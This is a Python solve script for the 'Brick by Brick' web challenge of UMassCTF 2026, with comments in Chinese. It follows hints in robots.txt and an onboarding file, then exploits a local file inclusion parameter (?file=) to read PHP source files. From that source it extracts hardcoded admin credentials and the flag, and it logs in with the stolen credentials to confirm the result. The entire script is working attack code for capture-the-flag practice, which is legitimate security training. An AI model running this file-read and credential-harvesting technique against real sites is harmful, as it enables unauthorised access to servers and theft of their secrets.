#!/usr/bin/env python3
"""
UMassCTF 2026 - Brick by Brick

解题脚本说明：
1. 读取 robots.txt，确认隐藏的 /internal-docs/ 目录存在
2. 拉取 onboarding 文档，确认 ?file= 文件读取和 config.php 线索
3. 通过 ?file= 读取 config.php 和 dashboard-admin.php
4. 从后台源码中提取默认凭据和 flag
5. 使用默认凭据实际登录一次，验证页面中确实返回相同 flag

脚本只使用 Python 标准库，避免额外依赖。
"""

from __future__ import annotations

import html
import re
import sys
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar


BASE_URL = "http://brick-by-brick.web.ctf.umasscybersec.org:32769"


def fetch(url: str, data: bytes | None = None, opener: urllib.request.OpenerDirector | None = None) -> str:
    """发送 GET/POST 请求并返回 UTF-8 文本响应。"""
    request = urllib.request.Request(url, data=data)
    active_opener = opener or urllib.request.build_opener()
    with active_opener.open(request, timeout=15) as response:
        return response.read().decode("utf-8", errors="replace")


def read_file_via_lfi(path: str) -> str:
    """利用 ?file= 功能读取 Web 根目录下的文件。"""
    quoted = urllib.parse.quote(path, safe="/.")
    response = fetch(f"{BASE_URL}/?file={quoted}")

    # 站点会把源码包在 <pre>...</pre> 中并做 HTML 转义，因此这里需要反解码。
    pre_match = re.search(r"<pre>(.*?)</pre>", response, re.DOTALL | re.IGNORECASE)
    if not pre_match:
        raise RuntimeError(f"未能从响应中提取 {path} 的源码")
    return html.unescape(pre_match.group(1))


def extract_php_define(source: str, name: str) -> str:
    """从 PHP 源码中提取 define('NAME', 'value') 的值。"""
    pattern = rf"define\(\s*['\"]{re.escape(name)}['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)"
    match = re.search(pattern, source)
    if not match:
        raise RuntimeError(f"未能在源码中找到常量 {name}")
    return match.group(1)


def main() -> int:
    print(f"[+] Target: {BASE_URL}")

    robots = fetch(f"{BASE_URL}/robots.txt")
    print("[+] robots.txt loaded")
    if "/internal-docs/" not in robots:
        raise RuntimeError("robots.txt 中没有发现 /internal-docs/ 线索")

    onboarding = fetch(f"{BASE_URL}/internal-docs/it-onboarding.txt")
    print("[+] it-onboarding.txt loaded")
    if "?file=" not in onboarding or "config.php" not in onboarding:
        raise RuntimeError("onboarding 文档中没有发现 ?file= 或 config.php 线索")

    config_source = read_file_via_lfi("config.php")
    dashboard_path_match = re.search(r"/dashboard-admin\.php", config_source)
    if not dashboard_path_match:
        raise RuntimeError("config.php 中没有发现后台路径")
    dashboard_path = dashboard_path_match.group(0)
    print(f"[+] dashboard path: {dashboard_path}")

    dashboard_source = read_file_via_lfi("dashboard-admin.php")
    username = extract_php_define(dashboard_source, "DASHBOARD_USER")
    password = extract_php_define(dashboard_source, "DASHBOARD_PASS")
    flag = extract_php_define(dashboard_source, "FLAG")
    print(f"[+] credentials recovered: {username} / {password}")
    print(f"[+] flag from source: {flag}")

    # 用 CookieJar 保持会话，验证提交默认凭据后页面里确实存在同一个 flag。
    cookie_jar = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
    payload = urllib.parse.urlencode(
        {"username": username, "password": password}
    ).encode()
    response = fetch(f"{BASE_URL}{dashboard_path}", data=payload, opener=opener)
    if flag not in response:
        raise RuntimeError("登录成功后页面中没有发现预期 flag")

    print("[+] login verification succeeded")
    print(flag)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:  # pragma: no cover - 便于命令行观察异常
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
